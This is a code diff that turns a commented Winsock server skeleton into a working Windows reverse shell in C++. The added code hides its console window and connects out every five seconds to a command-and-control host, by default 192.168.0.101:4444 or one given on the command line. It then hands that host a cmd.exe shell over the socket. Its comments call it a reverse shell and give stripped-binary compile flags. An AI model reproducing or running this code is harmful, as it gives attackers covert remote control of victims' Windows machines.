@@ -1,77 +1,83 @@
 #include <iostream>
-#include <WinSock2.h>
-#include <WS2tcpip.h>
-
+#include <winsock2.h>
+#include <windows.h>
+#include <ws2tcpip.h>
 #pragma comment(lib, "Ws2_32.lib")
+#define DEFAULT_BUFLEN 1024
+
 using namespace std;
 
-int main() {
-	// служебная структура для хранение информации
-	// о реализации Windows Sockets
-	WSADATA wsaData;
-	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
-	// Если произошла ошибка подгрузки библиотеки
-	if (result != 0) {
-		cerr << "WSAStartup failed: " << result << "\n";
-		return result;
-	}
+//This is a simple C++ based reverse shell give us a windows cmd shell over TCP.
+//Maybe need to install mingw-w64
+//To compile this you need to i686-w64-mingw32-g++ %Namefile%.cpp -o re.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+//%Namefile% to need change 
 
-	struct addrinfo* addr = NULL; // структура, хранящая информацию
-	// об IP-адресе  слущающего сокета
+void RunShell(char* C2Server, int C2Port) {
+    while (true) {
+        Sleep(5000);    // Five Second
 
-	// Шаблон для инициализации структуры адреса
-	struct addrinfo hints;
-	ZeroMemory(&hints, sizeof(hints));
+        SOCKET mySocket;
+        sockaddr_in addr;
+        WSADATA version;
+        WSAStartup(MAKEWORD(2, 2), &version);
+        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+        addr.sin_family = AF_INET;
 
-	// AF_INET определяет, что используется сеть для работы с сокетом
-	hints.ai_family = AF_INET;
-	hints.ai_socktype = SOCK_STREAM; // Задаем потоковый тип сокета
-	hints.ai_protocol = IPPROTO_TCP; // Используем протокол TCP
-	// Сокет биндится на адрес, чтобы принимать входящие соединения
-	hints.ai_flags = AI_PASSIVE;
+        addr.sin_addr.s_addr = inet_addr(C2Server);
+        addr.sin_port = htons(C2Port);
 
-	result = getaddrinfo("62.80.183.236", "1234", &hints, &addr);
+        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+            closesocket(mySocket);
+            WSACleanup();
+            continue;
+        }
+        else {
+            char RecvData[DEFAULT_BUFLEN];
+            memset(RecvData, 0, sizeof(RecvData));
+            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
+            if (RecvCode <= 0) {
+                closesocket(mySocket);
+                WSACleanup();
+                continue;
+            }
+            else {
+                wchar_t Process[] = L"C:\\WINDOWS\\System32\\cmd.exe"; // need to echar_t because Ctreate process dont work
+                STARTUPINFO sinfo;
+                PROCESS_INFORMATION pinfo;
+                memset(&sinfo, 0, sizeof(sinfo));
+                sinfo.cb = sizeof(sinfo);
+                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
+                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+                WaitForSingleObject(pinfo.hProcess, INFINITE);
+                CloseHandle(pinfo.hProcess);
+                CloseHandle(pinfo.hThread);
 
-	// Если инициализация структуры адреса завершилась с ошибкой,
-	// выведем сообщением об этом и завершим выполнение программы 
-	if (result != 0) {
-		cerr << "getaddrinfo failed: " << result << "\n";
-		WSACleanup(); // выгрузка библиотеки Ws2_32.dll
-		return 1;
-	}
+                memset(RecvData, 0, sizeof(RecvData));
+                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
+                if (RecvCode <= 0) {
+                    closesocket(mySocket);
+                    WSACleanup();
+                    continue;
+                }
+                if (strcmp(RecvData, "exit\n") == 0) {
+                    exit(0);
+                }
+            }
+        }
+    }
+}
 
-	// Создание сокета
-	int listen_socket = socket(addr->ai_family, addr->ai_socktype,
-		addr->ai_protocol);
-	// Если создание сокета завершилось с ошибкой, выводим сообщение,
-	// освобождаем память, выделенную под структуру addr,
-	// выгружаем dll-библиотеку и закрываем программу
-	if (listen_socket == INVALID_SOCKET) {
-		cerr << "Error at socket: " << WSAGetLastError() << "\n";
-		freeaddrinfo(addr);
-		WSACleanup();
-		return 1;
-	}
-
-
-	/////////////////////////////////////////////////////////////
-
-
-	// Привязываем сокет к IP-адресу
-	result = bind(listen_socket, addr->ai_addr, (int)addr->ai_addrlen);
-
-	// Если привязать адрес к сокету не удалось, то выводим сообщение
-	// об ошибке, освобождаем память, выделенную под структуру addr.
-	// и закрываем открытый сокет.
-	// Выгружаем DLL-библиотеку из памяти и закрываем программу.
-	if (result == SOCKET_ERROR) {
-		cerr << "bind failed with error: " << WSAGetLastError() << "\n";
-		freeaddrinfo(addr);
-		closesocket(listen_socket);
-		WSACleanup();
-		return 1;
-	}
-
-
-
+int main(int argc, char** argv) {
+    FreeConsole();
+    if (argc == 3) {
+        int port = atoi(argv[2]);
+        RunShell(argv[1], port);
+    }
+    else {
+        char host[] = "192.168.0.101";  // change this to your ip address
+        int port = 4444;                //chnage this to your open port
+        RunShell(host, port);
+    }
+    return 0;
 }
